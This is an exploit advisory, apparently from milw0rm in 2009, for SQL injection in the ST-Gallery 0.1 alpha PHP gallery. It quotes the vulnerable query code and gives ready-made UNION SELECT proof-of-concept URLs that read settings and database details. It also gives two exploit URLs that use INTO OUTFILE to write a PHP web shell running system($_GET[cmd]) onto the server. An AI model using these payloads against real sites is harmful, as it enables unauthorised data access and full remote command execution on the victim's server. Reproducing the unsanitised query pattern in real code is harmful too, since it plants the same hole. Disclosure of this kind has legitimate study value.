<html><head><title>ST-Gallery 0.1a Multiple SQL Injection Vulnerabilities</title></head><pre>***********************************************************************************************
***********************************************************************************************
**	       										     **
**  											     **
**     [] [] []  [][][][&gt;  []     []  [][  ][]     []   [][]]  []  [&gt;  [][][][&gt;  [][][][]    **
**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
** [&gt;  [][][][]  [][][][&gt;  [] []  []   []  []   [][]  []       [][]    [][][][&gt;  []    []    **
**  [-----[]-----[][][][&gt;--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][&gt;--[][][][]---\ 
**==[&gt;    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  &gt;&gt;--
**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
   [&gt;   [[[]]]   [][][][&gt;  [][]   [] [][[] [[]]  [][]  [][][]  []  [&gt;  [][][][&gt; &lt;][]   []    **
**							                                     **
**    											     **
**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
**					¡PROUD TO BE SPANISH!				     **
**											     **
***********************************************************************************************
***********************************************************************************************

----------------------------------------------------------------------------------------------
|       	   	    	 SQL INJECTION VULNERABILITIES		             	     |
|--------------------------------------------------------------------------------------------|
|                               | ST-Gallery version 0.1 alpha  |		 	     |
|  CMS INFORMATION:		 -------------------------------	                     |
|										             |
|--&gt;WEB: http://blog.sebastian-thiele.net/projekte/gallery/          			     |
|--&gt;DOWNLOAD: http://sourceforge.net/projects/st-gallery/                   		     |
|--&gt;DEMO: N/A										     |
|--&gt;CATEGORY: CMS / Image Galleries							     |
|--&gt;DESCRIPTION: Diese Galerie ist der erste Teil einer Projektreihe.      	             |
|		Diese Galerie ist für Leute gedacht, die sich mit der  PHP-Programmierung... |
|--&gt;RELEASED: 2009-02-26								     |
|											     |
|  CMS VULNERABILITY:									     |
|											     |
|--&gt;TESTED ON: firefox 3						                     |
|--&gt;DORK: N/A									             |
|--&gt;CATEGORY: SQL INJECTION							             |
|--&gt;AFFECT VERSION: CURRENT						 		     |
|--&gt;Discovered Bug date: 2009-04-05							     |
|--&gt;Reported Bug date: 2009-04-05							     |
|--&gt;Fixed bug date: Not fixed								     |
|--&gt;Info patch: Not fixed							             |
|--&gt;Author: YEnH4ckEr									     |
|--&gt;mail: y3nh4ck3r[at]gmail[dot]com							     |
|--&gt;WEB/BLOG: N/A									     |
|--&gt;COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
|--&gt;EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     |
----------------------------------------------------------------------------------------------


#########################
////////////////////////

SQL INJECTION (SQLi):

////////////////////////
#########################


&lt;&lt;&lt;&lt;---------++++++++++++++ Condition: magic_quotes_gpc=off +++++++++++++++++---------&gt;&gt;&gt;&gt;


-------
INTRO:
-------


This is a crazy app, admin zone isn't protected, perhaps it needs a .htaccess file. Database doesn't store

information about users (or admin).


------------
FILES VULN:
------------

Path --&gt; [HOME_PATH]/example.php

...

if($_GET[gallery_category]){

	getGalleryImage($_GET[gallery_category], $_GET[gallery_show], true, &quot;both&quot;, 450, &quot;&quot;);

}

...

Path --&gt; [HOME_PATH0]/st_admin/gallery_output.php

...

function getGalleryImage($album, $image, $showAlbum, $posNav, $maxWidth){ 

if($showAlbum){    

	$abfrage = &quot;SELECT * FROM &quot;.$db_prefix.&quot;gallery_category WHERE id = '$album'&quot;;   
	$ergebnis = mysql_query($abfrage);   
...
  
}  
$abfrage = &quot;SELECT * FROM &quot;.$db_prefix.&quot;gallery_images WHERE category = '$album'&quot;;  
$ergebnis = mysql_query($abfrage); 

...


-------------------
PROOFS OF CONCEPT:
-------------------


GET vars --&gt; gallery_category and gallery_show


PoC-1: http://[HOST]/[HOME_PATH]/example.php?gallery_category=-1%27+UNION+ALL+SELECT+1,concat(name,0x3A3A3A,value)+FROM+st_settings+WHERE+id=2/*


Return --&gt; gallery_path = ... (**take note)


PoC-2: http://127.0.0.1/st-gallery/example.php?gallery_category=1&amp;gallery_show=-1%27+union+all+select+1,version(),database(),4,5,6/*


Return --&gt; version and databse


-------------------------
EXPLOITS (SHELL UPLOAD):
-------------------------


&lt;&lt;&lt;&lt;---------++++++++++++++ Condition: Permission to create files +++++++++++++++++---------&gt;&gt;&gt;&gt;


[COMPLETE-PATH] --&gt; (**use note)


Ex-1: http://[HOST]/[HOME_PATH]/example.php?gallery_category=-1%27+UNION+ALL+SELECT+'&lt;HTML&gt;&lt;title&gt;SHELL BY --Y3NH4CK3R--&gt;&lt;/title&gt;&lt;body text=ffffff bgcolor=000000&gt;&lt;center&gt;&lt;h1&gt;YOUR SHELL IS ON!&lt;br&gt;&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;&lt;br&gt;&lt;font color=ff0000&gt;&lt;h2&gt;Get var (cmd) to execute comands. Enjoy it!&lt;/h2&gt;&lt;/font&gt;&lt;h3&gt;Command Result:&lt;/h3&gt;&lt;?php system($_GET[cmd]); ?&gt;','&lt;br&gt;&lt;br&gt;&lt;font color=ff0000&gt;&lt;h3&gt;By y3nh4ck3r. Contact: y3nh4ck3r@gmail.com&lt;/h3&gt;&lt;/font&gt;&lt;/body&gt;&lt;/HTML&gt;'+INTO+OUTFILE+'[COMPLETE-PATH]/shell.php'/*


Ex-1: http://[HOST]/[HOME_PATH]/example.php?gallery_category=1&amp;gallery_show=-1%27+UNION+ALL+SELECT+'&lt;HTML&gt;&lt;title&gt;SHELL BY --Y3NH4CK3R--&gt;&lt;/title&gt;&lt;body text=ffffff bgcolor=000000&gt;&lt;center&gt;&lt;h1&gt;YOUR SHELL IS ON!&lt;br&gt;&lt;/h1&gt;','&lt;/center&gt;&lt;br&gt;&lt;br&gt;&lt;font color=ff0000&gt;&lt;h2&gt;Get var (cmd) to execute comands. Enjoy it!&lt;/h2&gt;&lt;/font&gt;','&lt;h3&gt;Command Result:&lt;/h3&gt;&lt;?php system($_GET[cmd]); ?&gt;','&lt;br&gt;&lt;br&gt;&lt;font color=ff0000&gt;','&lt;h3&gt;By y3nh4ck3r. Contact: y3nh4ck3r@gmail.com&lt;/h3&gt;','&lt;/font&gt;&lt;/body&gt;&lt;/HTML&gt;'+INTO+OUTFILE+'[COMPLETE-PATH]/shell.php'/*


Return: Your shell in --&gt; http://[HOST]/[HOME_PATH]/shell.php



&lt;&lt;&lt;-----------------------------EOF----------------------------------&gt;&gt;&gt;ENJOY IT!


#######################################################################
#######################################################################
##*******************************************************************##
##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
##*******************************************************************##
##-------------------------------------------------------------------##
##*******************************************************************##
##     GREETZ TO: JosS, Ulises2k and all spanish Hack3Rs community!  ##
##*******************************************************************##
#######################################################################
#######################################################################

# milw0rm.com [2009-05-07]</pre></html>